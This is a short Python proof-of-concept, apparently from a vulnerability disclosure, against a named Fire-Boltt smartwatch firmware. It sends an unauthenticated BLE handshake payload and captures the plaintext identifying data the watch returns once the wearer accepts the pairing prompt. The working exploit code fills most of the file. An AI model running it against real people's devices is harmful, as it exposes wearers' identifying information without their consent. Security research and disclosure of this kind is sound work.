"""
Finding B: Pairing-Triggered Plaintext Information Disclosure
Fire-Boltt BSW013 Smartwatch, Firmware V0.0.8

Sends an unauthenticated identity/handshake command that triggers the
watch's native pairing confirmation prompt. If the wearer accepts, the
watch transmits device-identifying info in plaintext over the still
unbonded BLE link.

Requires: bleak (pip install bleak)
"""

import asyncio
from bleak import BleakClient

WATCH_MAC = "XX:XX:XX:XX:XX:XX"  # replace with target watch MAC
RX_UUID = "6e400002-b5a3-f393-e0a9-e50e24dcca9e"
TX_UUID = "6e400003-b5a3-f393-e0a9-e50e24dcca9e"

IDENTITY_1 = bytes.fromhex("AB010007 9ABB 03 01 20 B497D4C1".replace(" ", ""))


def notification_handler(sender, data):
    print(f"  [NOTIFY] {data.hex(' ').upper()}")


async def main():
    print(f"Connecting to {WATCH_MAC}...")
    async with BleakClient(WATCH_MAC) as client:
        print("Connected! Subscribing to TX notify...")
        await client.start_notify(TX_UUID, notification_handler)
        await asyncio.sleep(1.0)

        print(f"\nSending IDENTITY_1: {IDENTITY_1.hex(' ').upper()}")
        print(">>> WATCH SCREEN NOW <<<")
        await client.write_gatt_char(RX_UUID, IDENTITY_1, response=False)
        await asyncio.sleep(5)
        print("Done.")


if __name__ == "__main__":
    asyncio.run(main())
